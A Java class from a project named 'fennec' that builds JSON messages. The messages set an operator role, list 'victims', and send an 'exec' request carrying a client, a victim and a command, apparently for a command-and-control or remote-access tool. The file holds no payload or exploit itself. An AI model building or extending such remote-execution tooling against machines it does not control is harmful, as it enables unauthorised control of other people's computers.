package com.heshanthenura.fennec;

import java.util.HashMap;
import java.util.Map;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

public class Commands {

    public String setRole() {
        Map<String, String> response = new HashMap<>();
        response.put("type", "set_role");
        response.put("role", "heshan");

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.writeValueAsString(response); 
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"status\": \"error\", \"message\": \"Failed to generate JSON\"}";
        }
    }

    public String getVictims(){
        Map<String, String> response = new HashMap<>();
        response.put("type", "info");
        response.put("info_name", "lv");

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.writeValueAsString(response);
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"status\": \"error\", \"message\": \"Failed to generate JSON\"}";
        }
    }

    public String exec(String client,String victim,String command){
        Map<String, String> response = new HashMap<>();
        response.put("type", "exec");
        response.put("state", "req");
        response.put("client", client);
        response.put("victim", victim);
        response.put("command",command);

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            return objectMapper.writeValueAsString(response);
        } catch (Exception e) {
            e.printStackTrace();
            return "{\"status\": \"error\", \"message\": \"Failed to generate JSON\"}";
        }
    }

}
